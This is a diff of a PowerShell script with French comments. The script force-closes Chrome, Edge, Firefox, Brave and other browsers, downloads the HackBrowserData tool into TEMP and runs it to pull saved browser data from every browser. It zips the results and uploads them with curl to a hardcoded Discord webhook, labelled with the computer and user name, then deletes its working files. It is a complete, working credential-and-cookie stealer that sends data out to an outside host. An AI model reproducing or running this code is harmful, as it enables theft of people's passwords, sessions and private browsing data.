@@ -1,4 +1,3 @@
-# HackBrowserData Demo - SANS fermer Brave
 $wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"
 
 function Send-Discord {
@@ -11,114 +10,79 @@ function Send-Discord {
 
 Send-Discord "🟢 **START** - PC: $env:COMPUTERNAME | User: $env:USERNAME"
 
-# Tuer SEULEMENT Chrome, Edge, Firefox (PAS Brave)
-@("chrome","msedge","firefox","opera","vivaldi") | ForEach-Object {
+# Tuer navigateurs
+@("chrome","msedge","firefox","brave","opera","vivaldi") | ForEach-Object {
     Get-Process -Name $_ -EA 0 | Stop-Process -Force -EA 0
 }
 
 Start-Sleep 5
 
-# Nettoyer TEMP
 Set-Location $env:TEMP
-Send-Discord "📂 Working dir: $env:TEMP"
 Remove-Item hbd.zip,HBD,results.zip -Recurse -Force -EA 0
 
-Send-Discord "📥 **Downloading tool...**"
+Send-Discord "📥 **Downloading HackBrowserData...**"
 
 try {
-    # Télécharger
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    $url = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-v0.4.6-windows-amd64.zip"
     
-    Send-Discord "🌐 Starting download from GitHub..."
+    # NOUVELLE URL - Version la plus récente
+    $url = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.7/hack-browser-data-v0.4.7-windows-amd64.zip"
+    
     Invoke-WebRequest -Uri $url -OutFile "hbd.zip" -UseBasicParsing
     
-    # DEBUG - Vérifier le téléchargement
-    $fileExists = Test-Path "hbd.zip"
-    $fileSize = if($fileExists){(Get-Item "hbd.zip").Length}else{0}
-    Send-Discord "🔍 **DEBUG:** File exists=$fileExists | Size=$fileSize bytes"
-    
-    if (!$fileExists -or $fileSize -lt 1000) {
-        Send-Discord "❌ **Download FAILED** - File not created or too small"
+    if (!(Test-Path "hbd.zip")) {
+        Send-Discord "❌ **Download failed - file not created**"
         exit
     }
     
+    $fileSize = (Get-Item "hbd.zip").Length
+    Send-Discord "✅ **Downloaded** - Size: $([math]::Round($fileSize/1KB,2)) KB"
+    
     Send-Discord "📦 **Extracting...**"
-    
-    # Extraire
     Expand-Archive -Path "hbd.zip" -DestinationPath "HBD" -Force
-    
-    # DEBUG - Vérifier extraction
-    $hbdExists = Test-Path "HBD"
-    Send-Discord "🔍 **DEBUG:** HBD folder exists=$hbdExists"
-    
-    if ($hbdExists) {
-        $files = Get-ChildItem "HBD" -Recurse | Select-Object -First 10 -ExpandProperty Name
-        Send-Discord "🔍 **Files in HBD:** $($files -join ', ')"
-    }
     
     Set-Location "HBD"
     
-    $exeExists = Test-Path "hack-browser-data.exe"
-    Send-Discord "🔍 **DEBUG:** EXE exists=$exeExists"
-    
-    if (!$exeExists) {
+    if (!(Test-Path "hack-browser-data.exe")) {
         Send-Discord "❌ **EXE not found after extraction**"
         exit
     }
     
-    Send-Discord "🔓 **Extracting browser data (Brave still running)...**"
+    Send-Discord "🔓 **Extracting browser data...**"
     
-    # Exécuter - Brave restera ouvert mais les données pourraient être partielles
     Start-Process -FilePath ".\hack-browser-data.exe" -ArgumentList "--browser all --format json --dir output --zip" -Wait -NoNewWindow
     
     Start-Sleep 3
     
-    # DEBUG - Vérifier ce qui a été créé
-    $resultsExists = Test-Path "results.zip"
-    $outputExists = Test-Path "output"
-    Send-Discord "🔍 **DEBUG:** results.zip=$resultsExists | output folder=$outputExists"
-    
-    if ($outputExists) {
-        $outputFiles = Get-ChildItem "output" -Recurse | Select-Object -First 10 -ExpandProperty Name
-        Send-Discord "🔍 **Output contains:** $($outputFiles -join ', ')"
-    }
-    
-    # Vérifier résultat
     if (Test-Path "results.zip") {
         $size = [math]::Round((Get-Item "results.zip").Length / 1KB, 2)
         Send-Discord "📤 **Uploading $size KB...**"
         
-        # Upload
         $date = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
-        curl.exe -F "file=@results.zip" -F "content=✅ **EXTRACTED DATA**`n**PC:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Size:** $size KB`n**Date:** $date" $wh
+        curl.exe -F "file=@results.zip" -F "content=✅ **DATA EXTRACTED**`n**PC:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Size:** $size KB`n**Date:** $date" $wh
         
         Send-Discord "✅ **Upload SUCCESS**"
     }
     elseif (Test-Path "output") {
-        Send-Discord "⚠️ **No results.zip, trying manual compress...**"
+        Send-Discord "⚠️ **Creating manual archive...**"
         
         Compress-Archive -Path "output\*" -DestinationPath "manual.zip" -Force
         
         if (Test-Path "manual.zip") {
             $size = [math]::Round((Get-Item "manual.zip").Length / 1KB, 2)
-            Send-Discord "📤 **Uploading manual.zip ($size KB)...**"
-            curl.exe -F "file=@manual.zip" -F "content=📁 **Manual backup from $env:COMPUTERNAME**" $wh
+            curl.exe -F "file=@manual.zip" -F "content=📁 **Fallback data ($size KB)**" $wh
             Send-Discord "✅ **Manual upload done**"
-        } else {
-            Send-Discord "❌ **Failed to create manual.zip**"
         }
     }
     else {
-        Send-Discord "❌ **No output found at all**"
+        Send-Discord "❌ **No output created**"
     }
     
 } catch {
-    $err = $_.Exception.Message -replace '"',"'" -replace '\n',' ' -replace '\r',''
-    Send-Discord "❌ **EXCEPTION:** $err"
+    $err = $_.Exception.Message -replace '"',"'" 
+    Send-Discord "❌ **Error:** $err"
 }
 
-# Cleanup
 Set-Location ..
 Start-Sleep 2
 Remove-Item hbd.zip,HBD -Recurse -Force -EA 0
